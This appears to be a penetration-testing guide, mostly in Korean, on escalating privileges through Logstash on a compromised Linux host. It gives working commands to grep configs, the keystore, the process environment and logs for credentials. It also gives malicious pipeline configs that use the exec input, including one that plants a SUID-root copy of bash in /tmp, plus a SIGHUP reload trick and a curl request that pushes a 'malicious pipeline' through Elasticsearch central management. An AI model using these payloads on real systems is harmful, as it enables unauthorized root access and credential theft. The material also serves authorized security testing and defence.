# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash는 **로그를 수집하고 변환하며 전송**하는 데 사용되며, **pipelines**라고 불리는 시스템을 통해 동작합니다. 이러한 pipelines는 **input**, **filter**, **output** 단계로 구성됩니다. 침해된 시스템에서 Logstash가 동작할 때 흥미로운 점이 발생합니다.

### Pipeline Configuration

Pipelines는 파일 **/etc/logstash/pipelines.yml**에서 구성되며, 이 파일은 파이프라인 구성의 위치들을 나열합니다:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
이 파일은 파이프라인 구성을 포함하는 **.conf** 파일들이 어디에 위치하는지 보여준다. **Elasticsearch output module**를 사용할 때, **pipelines**에 **Elasticsearch credentials**가 포함되는 경우가 흔하며, 이는 Logstash가 Elasticsearch에 데이터를 써야 하기 때문에 대개 광범위한 권한을 가진다. 설정 경로의 와일드카드는 Logstash가 지정된 디렉토리에서 일치하는 모든 **pipelines**를 실행하도록 허용한다.

Logstash가 `pipelines.yml` 대신 `-f <directory>`로 시작되면, **해당 디렉토리 내의 모든 파일이 사전식 순서로 연결되어 단일 설정으로 파싱된다**. 이로 인해 공격 측면에서 다음 두 가지 영향이 생긴다:

- `000-input.conf`나 `zzz-output.conf` 같은 추가된 파일이 최종 pipeline의 구성 방식을 변경할 수 있다
- 형식이 잘못된 파일은 전체 pipeline의 로딩을 방해할 수 있으므로 auto-reload에 의존하기 전에 payloads를 신중히 검증하라

### 침해된 호스트에서 빠른 열거

Logstash가 설치된 호스트에서는 빠르게 다음을 확인하라:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
또한 로컬 모니터링 API에 접근 가능한지 확인하세요. 기본적으로 **127.0.0.1:9600**에 바인딩되어 있으며, 호스트에 진입한 이후에는 보통 충분합니다:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
이는 보통 파이프라인 ID, 런타임 세부 정보 및 수정한 파이프라인이 로드되었음을 확인해 줍니다.

Credentials recovered from Logstash commonly unlock **Elasticsearch**, so check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

privilege escalation을 시도하려면 먼저 Logstash 서비스가 어떤 사용자로 실행되는지 확인하세요. 일반적으로 **logstash** 사용자입니다. 다음 기준 중 **하나**를 충족해야 합니다:

- 파이프라인 **.conf** 파일에 대한 **write access**를 보유하거나 **or**
- **/etc/logstash/pipelines.yml** 파일이 와일드카드를 사용하고 대상 폴더에 쓸 수 있는 경우

또한 다음 조건들 중 **하나**는 충족되어야 합니다:

- Logstash 서비스를 재시작할 수 있는 권한이 있거나 **or**
- **/etc/logstash/logstash.yml** 파일에 **config.reload.automatic: true**가 설정되어 있는 경우

설정에 와일드카드가 있는 경우, 이 와일드카드와 일치하는 파일을 생성하면 명령 실행이 가능합니다. 예:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
여기서, **interval**은 실행 주기를 초 단위로 결정합니다. 예시에서 **whoami** 명령은 120초마다 실행되며 출력은 **/tmp/output.log**로 향합니다.

**config.reload.automatic: true**가 **/etc/logstash/logstash.yml**에 설정되어 있으면, Logstash는 재시작 없이 새로운 또는 수정된 pipeline 구성을 자동으로 감지하고 적용합니다. 와일드카드가 없더라도 기존 구성에 대한 수정은 여전히 가능하지만, 중단을 피하기 위해 주의해야 합니다.

### 더 신뢰할 수 있는 Pipeline Payloads

`exec` input plugin은 현재 릴리스에서도 여전히 동작하며 `interval` 또는 `schedule` 중 하나가 필요합니다. 이 플러그인은 Logstash JVM을 **forking**하여 실행되므로, 메모리가 부족하면 payload가 조용히 실행되지 않고 `ENOMEM`으로 실패할 수 있습니다.

더 실용적인 privilege-escalation payload는 보통 지속적인 artifact를 남기는 것입니다:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
재시작 권한이 없지만 프로세스에 시그널을 보낼 수 있다면, Logstash는 유닉스 계열 시스템에서 **SIGHUP** 신호로 트리거되는 리로드도 지원합니다:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
모든 플러그인이 재로드에 친화적인 것은 아니라는 점을 유의하세요. 예를 들어, **stdin** input은 자동 재로드를 방지하므로 `config.reload.automatic`이 항상 변경사항을 반영한다고 가정하지 마세요.

### Logstash에서 비밀 훔치기

코드 실행에만 집중하기 전에, Logstash가 이미 접근할 수 있는 데이터를 수집하세요:

- 평문 자격 증명은 종종 `elasticsearch {}` outputs, `http_poller`, JDBC inputs 또는 클라우드 관련 설정 안에 하드코딩되어 있습니다
- 보안 설정은 **`/etc/logstash/logstash.keystore`** 또는 다른 `path.settings` 디렉터리에 있을 수 있습니다
- keystore 암호는 자주 **`LOGSTASH_KEYSTORE_PASS`**를 통해 제공되며, 패키지 기반 설치는 일반적으로 **`/etc/sysconfig/logstash`**에서 이를 가져옵니다
- `${VAR}` 형태의 환경 변수 확장은 Logstash 시작 시에 해석되므로, 서비스 환경을 점검해볼 가치가 있습니다

유용한 점검:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
This is also worth checking because **CVE-2023-46672** showed that Logstash could record sensitive information in logs under specific circumstances. On a post-exploitation host, old Logstash logs and `journald` entries may therefore disclose credentials even if the current config references the keystore instead of storing secrets inline.

### Centralized Pipeline Management Abuse

In some environments, the host does **not** rely on local `.conf` files at all. If **`xpack.management.enabled: true`** is configured, Logstash can pull centrally managed pipelines from Elasticsearch/Kibana, and after enabling this mode local pipeline configs are no longer the source of truth.

That means a different attack path:

1. Recover Elastic credentials from local Logstash settings, the keystore, or logs
2. Verify whether the account has the **`manage_logstash_pipelines`** cluster privilege
3. Create or replace a centrally managed pipeline so the Logstash host executes your payload on its next poll interval

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
로컬 파일이 읽기 전용(read-only)이지만 Logstash가 이미 원격에서 파이프라인을 가져오도록 등록되어 있는 경우에 특히 유용합니다.

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
